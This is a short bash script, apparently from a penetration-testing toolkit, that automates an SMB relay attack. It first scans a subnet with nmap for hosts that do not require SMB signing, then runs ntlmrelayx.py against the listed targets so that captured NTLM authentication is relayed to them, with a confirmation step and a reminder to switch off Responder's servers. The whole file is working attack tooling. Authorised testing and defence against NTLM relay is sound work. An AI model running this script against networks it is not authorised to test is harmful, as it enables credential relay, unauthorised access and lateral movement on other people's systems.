#!/usr/bin/env bash
# SMB relay: relay captured auth to hosts that don't enforce SMB signing.
# Mirrors: smb-relay-attack.md (nmap signing check + ntlmrelayx.py)
#
# Step 1 finds relay candidates (SMB signing not required). Step 2 runs
# ntlmrelayx against that target list. Responder's SMB/HTTP servers must be OFF
# while relaying (set SMB = Off / HTTP = Off in Responder.conf), or they fight
# ntlmrelayx for the same ports.

cd "$(dirname "$0")"
source ./lib.sh

MODE=""
SUBNET=""
TARGETS="targets.txt"
while [[ $# -gt 0 ]]; do
  case "$1" in
    scan)   MODE="scan";  SUBNET="${2:-}"; shift 2 ;;
    relay)  MODE="relay"; shift ;;
    -t|--targets) TARGETS="${2:-}"; shift 2 ;;
    -h|--help) usage_and_exit "$0 scan <subnet/CIDR>   |   $0 relay [-t <targets.txt>]" ;;
    *)      usage_and_exit "$0 scan <subnet/CIDR>   |   $0 relay [-t <targets.txt>]" ;;
  esac
done

case "$MODE" in
  scan)
    [[ -n "$SUBNET" ]] || usage_and_exit "$0 scan <subnet/CIDR>"
    need nmap
    info "Scanning '$SUBNET' for hosts where SMB signing is not required (relay candidates)."
    run nmap --script smb2-security-mode -p445 "$SUBNET"
    info "Put the IPs that report 'signing not required' into '$TARGETS', one per line, then: $0 relay"
    ;;
  relay)
    [[ -f "$TARGETS" ]] || die "Targets file not found: $TARGETS (run '$0 scan <subnet>' first)"
    need ntlmrelayx.py
    authorize "the hosts listed in '$TARGETS'"
    warn "Confirm Responder's SMB and HTTP servers are OFF before relaying."
    run ntlmrelayx.py -tf "$TARGETS" -smb2support
    ;;
  *)
    usage_and_exit "$0 scan <subnet/CIDR>   |   $0 relay [-t <targets.txt>]"
    ;;
esac
